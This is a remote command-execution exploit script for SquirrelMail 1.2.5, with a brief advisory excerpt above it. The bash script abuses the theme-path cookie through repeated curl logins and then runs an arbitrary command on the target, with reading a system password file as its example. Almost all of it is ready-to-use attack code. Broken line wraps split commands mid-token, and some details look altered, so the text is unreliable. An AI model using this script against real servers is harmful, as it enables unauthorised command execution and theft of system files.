#source: https://www.securityfocus.com/bid/4385/info
#
#SquirrelMail is a feature rich webmail program implemented in the PHP4 language. It is available for Linux and Unix based operating systems. SquirrelMail allows for extended functionality through a plugin system.
#
#A vulnerability has been reported in some versions of SquirrelMail. Reportedly, it is possible to corrupt the variable used to select a user's theme, and force the vulnerable script to execute arbitrary commands.

#!/bin/bash
#
# squirrelmail-1.2.5 remote execution by pokleyzz
#http://www.inetd-secure.net
#
# usage   : ./sq125x themecount username password
#url command
# example : ./sq125x 2 pokley 123456
#http://mail.pokleyzz.my/mail "cat /etc/passwd.json"
#
# curl can be found at http://curl.haxx.se/libcurl/
#

export
PATH="/usr/bin:/bin:/usr/local/bin:/sbin:/usr/sbin:/usr/l
ocal/sbin"
export CURL="/usr/bin/curl"
export USERNAME="$2"
export PASSWORD="$3"
export THEME_COUNT="$1"
export URL="$4"
export COMMAND=`echo $5|sed 's/\ /%20/g' -`
export TMPFILE="header.tmp"
export THEME="theme[${THEME_COUNT}][PATH]
=../data/${USERNAME}.pref; theme
[${THEME_COUNT}][NAME]=testing"

#step 1
sed "s/pokley/"$USERNAME"/g" post.txt >lame.txt
/bin/rm -rf ${TMPFILE}
$CURL -b "$THEME" -d
login_username=${USERNAME} -d
secretkey=${PASSWORD} -d
js_autodetect_results=0 -d just_logged_in=1 -D
${TMPFILE} ${URL}/src/redirect.php
export COOKIES=`cat ${TMPFILE} |grep Set-
Cookie|awk {'print $2'}|while read data;do printf '%b'
$data;done`
export COOKIES="${COOKIES} ${THEME}"
$CURL -b "$COOKIES" -d @lame.txt -o /tmp/.tmp --
silent ${URL}/src/options.php

#step 2
sleep 5s
$CURL -b "$THEME" -d
login_username=${USERNAME} -d
secretkey=${PASSWORD} -d
js_autodetect_results=0 -d just_logged_in=1 -D
${TMPFILE} ${URL}/src/redirect.php
export COOKIES=`cat ${TMPFILE} |grep Set-
Cookie|awk {'print $2'}|while read data;do printf '%b'
$data;done`
export COOKIES="${COOKIES} ${THEME}"
$CURL -b "$COOKIES" -d @lame.txt -o /tmp/.tmp --
silent ${URL}/src/options.php
$CURL -b "$COOKIES" ${URL}/src/left_main.php?
cmdd=${COMMAND}
$CURL -b "$COOKIES" -o /tmp/.tmp --silent
${URL}/src/signout.php
rm -rf lame.txt /tmp/.tmp